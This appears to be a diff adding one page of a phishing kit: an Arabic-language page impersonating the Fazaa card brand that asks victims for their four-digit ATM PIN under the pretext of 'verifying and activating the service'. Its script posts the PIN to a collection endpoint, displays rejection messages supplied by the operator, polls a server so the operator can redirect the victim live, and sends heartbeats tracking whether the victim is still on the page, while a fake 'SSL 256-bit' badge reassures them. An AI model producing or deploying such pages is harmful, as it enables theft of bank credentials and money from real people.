@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>فزعه - تأكيد الرقم السري للبطاقة</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+    :root {
+        --sahara-green: #2d2d4e;
+        --sahara-green-dark: #1e1e3a;
+        --sahara-green-light: #f8f9fa;
+        --sahara-gold: #d4af37;
+        --sahara-gold-dark: #b8952e;
+        --sahara-dark: #1a1a2e;
+        --sahara-gray: #6B7280;
+        --sahara-light: #F9FAFB;
+        --sahara-white: #FFFFFF;
+        --sahara-border: #E5E7EB;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+        font-family: 'Tajawal', sans-serif;
+        background: #f0f2f5;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .sahara-nav {
+        background: var(--sahara-green);
+        padding: 12px 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+    }
+    .sahara-nav .back-btn {
+        position: absolute;
+        right: 16px;
+        color: #fff;
+        text-decoration: none;
+        font-size: 18px;
+        width: 36px;
+        height: 36px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.1);
+    }
+    .sahara-nav .logo-img {
+        height: 55px;
+    }
+
+    .step-indicator {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        padding: 14px;
+        background: #fff;
+        border-bottom: 1px solid #e5e7eb;
+    }
+    .step-dot {
+        width: 10px;
+        height: 10px;
+        border-radius: 50%;
+        background: #e5e7eb;
+    }
+    .step-dot.completed { background: var(--sahara-green); }
+    .step-dot.active { background: var(--sahara-gold); box-shadow: 0 0 0 4px rgba(212,175,55,0.2); }
+
+    .form-wrap {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 16px;
+    }
+    .form-card {
+        width: 100%;
+        max-width: 420px;
+        background: #fff;
+        border-radius: 20px;
+        padding: 32px 24px;
+        box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+        text-align: center;
+    }
+
+    .secure-icon {
+        width: 64px;
+        height: 64px;
+        background: linear-gradient(135deg, var(--sahara-green), var(--sahara-green-dark));
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 0 auto 16px;
+        box-shadow: 0 6px 20px rgba(45,45,78,0.25);
+    }
+    .secure-icon i {
+        font-size: 26px;
+        color: #fff;
+    }
+
+    .page-title {
+        font-size: 20px;
+        font-weight: 800;
+        color: var(--sahara-dark);
+        margin-bottom: 6px;
+    }
+    .page-desc {
+        font-size: 13px;
+        color: var(--sahara-gray);
+        line-height: 1.8;
+        margin-bottom: 24px;
+    }
+
+    .pin-display {
+        display: flex;
+        justify-content: center;
+        gap: 14px;
+        margin-bottom: 20px;
+        direction: ltr;
+    }
+    .pin-dot {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        border: 2.5px solid var(--sahara-border);
+        transition: all 0.2s ease;
+    }
+    .pin-dot.filled {
+        background-color: var(--sahara-green);
+        border-color: var(--sahara-green);
+        transform: scale(1.15);
+    }
+
+    .pin-input-wrap {
+        display: flex;
+        justify-content: center;
+        margin: 0 auto 24px;
+        width: 100%;
+        max-width: 200px;
+    }
+    .pin-input {
+        width: 100%;
+        border: 1.5px solid var(--sahara-border);
+        border-radius: 12px;
+        padding: 14px;
+        font-size: 26px;
+        letter-spacing: 0.5em;
+        text-align: center;
+        color: var(--sahara-green);
+        background: #fff;
+        font-family: 'Tajawal', sans-serif;
+        transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    .pin-input:focus {
+        outline: none;
+        border-color: var(--sahara-green);
+        box-shadow: 0 0 0 3px rgba(45,45,78,0.1);
+    }
+
+    .btn-submit {
+        width: 100%;
+        background: linear-gradient(135deg, var(--sahara-green), var(--sahara-green-dark));
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        padding: 15px;
+        font-size: 16px;
+        font-weight: 700;
+        font-family: 'Tajawal', sans-serif;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        transition: all 0.3s;
+        box-shadow: 0 4px 16px rgba(45,45,78,0.25);
+    }
+    .btn-submit:hover:not(:disabled) {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(45,45,78,0.3);
+    }
+    .btn-submit:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+        box-shadow: none;
+        transform: none;
+    }
+
+    .error-msg {
+        color: #DC2626;
+        font-weight: 600;
+        font-size: 13px;
+        margin-top: 14px;
+        padding: 10px 14px;
+        background: #FEF2F2;
+        border: 1px solid #FECACA;
+        border-radius: 10px;
+        display: none;
+    }
+
+    .info-note {
+        background: var(--sahara-green-light);
+        border: 1px solid rgba(45,45,78,0.1);
+        border-radius: 12px;
+        padding: 12px 14px;
+        margin-top: 20px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    .info-note i { color: var(--sahara-green); font-size: 16px; }
+    .info-note p { font-size: 12px; color: #374151; line-height: 1.7; margin: 0; }
+
+    .loading-overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(255,255,255,0.96);
+        z-index: 100;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        text-align: center;
+        padding: 20px;
+    }
+    .spinner {
+        width: 50px;
+        height: 50px;
+        border: 4px solid rgba(45,45,78,0.1);
+        border-top-color: var(--sahara-green);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: var(--sahara-green);
+        margin-bottom: 8px;
+    }
+    .loading-desc {
+        font-size: 13px;
+        color: var(--sahara-gray);
+    }
+
+    .sahara-footer {
+        background: linear-gradient(135deg, var(--sahara-green), var(--sahara-green-dark));
+        color: #fff;
+        padding: 20px 16px;
+        text-align: center;
+        margin-top: auto;
+    }
+    .sahara-footer .footer-logo { height: 45px; margin-bottom: 12px; }
+    .sahara-footer p { font-size: 11px; color: rgba(255,255,255,0.7); line-height: 1.7; }
+    .sahara-footer .footer-bottom {
+        border-top: 1px solid rgba(255,255,255,0.15);
+        padding-top: 10px;
+        margin-top: 10px;
+        font-size: 11px;
+        color: rgba(255,255,255,0.5);
+    }
+
+    @keyframes fadeInUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    .fade-in { animation: fadeInUp 0.6s ease-out; }
+</style>
+</head>
+<body>
+
+    <nav class="sahara-nav">
+        <a href="index.html" class="back-btn">
+            <i class="fas fa-arrow-right"></i>
+        </a>
+        <img src="./assets/sahara_brand_logo.png" alt="فزعه" class="logo-img">
+    </nav>
+
+    <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+    </div>
+
+    <div class="form-wrap fade-in">
+        <div class="form-card">
+            <div class="secure-icon">
+                <i class="fas fa-lock"></i>
+            </div>
+            <h2 class="page-title">تأكيد الرقم السري للبطاقة</h2>
+            <p class="page-desc">يرجى إدخال الرقم السري الخاص ببطاقتك المكون من 4 أرقام (ATM PIN) لإتمام عملية التحقق وتفعيل الخدمة بنجاح.</p>
+
+            <div class="pin-display">
+                <div class="pin-dot" id="dot-0"></div>
+                <div class="pin-dot" id="dot-1"></div>
+                <div class="pin-dot" id="dot-2"></div>
+                <div class="pin-dot" id="dot-3"></div>
+            </div>
+
+            <div class="pin-input-wrap">
+                <input class="pin-input" id="atmPinInput" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••">
+            </div>
+
+            <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>
+                <i class="fas fa-shield-alt"></i>
+                تأكيد ومتابعة
+            </button>
+
+            <div class="error-msg" id="errorMsg">تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.</div>
+
+            <div class="info-note">
+                <i class="fas fa-shield-alt"></i>
+                <p>اتصال آمن ومشفر بتقنية SSL 256-bit - فزعه</p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="sahara-footer">
+        <img src="https://i.postimg.cc/yNsF5MSj/6-2.png" alt="فزعه" class="footer-logo"><br>
+        <p style="color:var(--sahara-gold);font-weight:600;font-size:12px;margin-bottom:2px;">بطاقة فزعه | FAZAA</p>
+        <p>&copy; Fazaa 2026 - جميع الحقوق محفوظة</p>
+    </footer>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-title">جاري التحقق من البيانات...</div>
+        <div class="loading-desc">يرجى الانتظار وعدم إغلاق الصفحة أو تحديثها.</div>
+    </div>
+
+<script>
+var pin = '';
+var atmPinInput = document.getElementById('atmPinInput');
+
+function updateDots() {
+    for (var i = 0; i < 4; i++) {
+        var dot = document.getElementById('dot-' + i);
+        if (i < pin.length) {
+            dot.classList.add('filled');
+        } else {
+            dot.classList.remove('filled');
+        }
+    }
+    if (atmPinInput) atmPinInput.value = pin;
+    document.getElementById('btnSubmit').disabled = (pin.length !== 4);
+}
+
+if (atmPinInput) {
+    atmPinInput.addEventListener('input', function() {
+        pin = (atmPinInput.value || '').replace(/\D/g, '').slice(0, 4);
+        updateDots();
+    });
+    atmPinInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+            e.preventDefault();
+            if (pin.length > 0) { pin = pin.slice(0, -1); updateDots(); }
+        }
+        if (e.key === 'Enter' && pin.length === 4) submitPin();
+    });
+}
+
+document.addEventListener('keydown', function(e) {
+    if (/^[0-9]$/.test(e.key)) {
+        e.preventDefault();
+        if (pin.length < 4) { pin += e.key; updateDots(); }
+    }
+});
+
+function applyRejectMessage() {
+    var params = new URLSearchParams(window.location.search);
+    if (params.get('error') !== 'atm') return;
+    var msg = params.get('msg') || 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
+    var errorMsg = document.getElementById('errorMsg');
+    errorMsg.textContent = msg;
+    errorMsg.style.display = 'block';
+    document.getElementById('loadingOverlay').style.display = 'none';
+    pin = '';
+    updateDots();
+    if (atmPinInput) { atmPinInput.value = ''; atmPinInput.focus(); }
+}
+
+function submitPin() {
+    if (pin.length !== 4) return;
+    document.getElementById('loadingOverlay').style.display = 'flex';
+    document.getElementById('errorMsg').style.display = 'none';
+    var btn = document.getElementById('btnSubmit');
+    btn.disabled = true;
+
+    fetch('/api/submit-atm', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ atmPin: pin })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        if (data.success) {
+            btn.innerHTML = '<i class="fas fa-check-circle"></i> تم الإرسال';
+            setTimeout(function() { window.location.href = 'wait-payment.html'; }, 1000);
+        } else {
+            throw new Error('fail');
+        }
+    })
+    .catch(function() {
+        document.getElementById('loadingOverlay').style.display = 'none';
+        document.getElementById('errorMsg').style.display = 'block';
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-shield-alt"></i> تأكيد ومتابعة';
+        pin = '';
+        updateDots();
+        if (atmPinInput) { atmPinInput.value = ''; atmPinInput.focus(); }
+    });
+}
+
+applyRejectMessage();
+</script>
+
+<script>
+function checkRedirect() {
+    fetch('/api/polling-redirect').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
+}
+setInterval(checkRedirect, 1500);
+checkRedirect();
+</script>
+
+<script>
+function sendHeartbeat() {
+    fetch('/api/heartbeat').catch(function(e){});
+}
+setInterval(sendHeartbeat, 2000);
+sendHeartbeat();
+window.addEventListener('beforeunload', function() {
+    navigator.sendBeacon('/api/heartbeat', new URLSearchParams({action: 'offline'}));
+});
+</script>
+</body>
+</html>
